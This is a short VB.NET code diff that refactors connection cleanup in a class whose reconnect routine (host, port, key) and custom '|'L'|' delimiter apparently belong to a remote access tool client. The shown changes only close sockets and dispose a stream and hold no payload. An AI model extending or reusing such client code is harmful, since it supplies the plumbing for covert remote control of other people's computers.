@@ -6,7 +6,6 @@ Public Class Main
     Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
 
         KEY = K
-        Dim M As New IO.MemoryStream ' create memory stream
         Dim lp As Integer = 0
 
 e:      ' clear things and ReConnect
@@ -72,10 +71,22 @@ rr:
         GoTo re
 
 cc:
+        CloseMe()
+    End Sub
+
+    Public Shared Sub CloseMe()
+        Try
+            C.Client.Close()
+        Catch ex As Exception
+        End Try
         Try
             C.Close()
-            C = Nothing
-        Catch ex As Exception
+        Catch ex2 As Exception
+        End Try
+        C = Nothing
+        Try
+            M.Dispose()
+        Catch ex4 As Exception
         End Try
     End Sub
 
@@ -149,5 +160,7 @@ cc:
     Public Shared _H
     Public Shared _P
     Public Shared SPL As String = "|'L'|"
+    Public Shared M As New IO.MemoryStream
+
 
 End Class
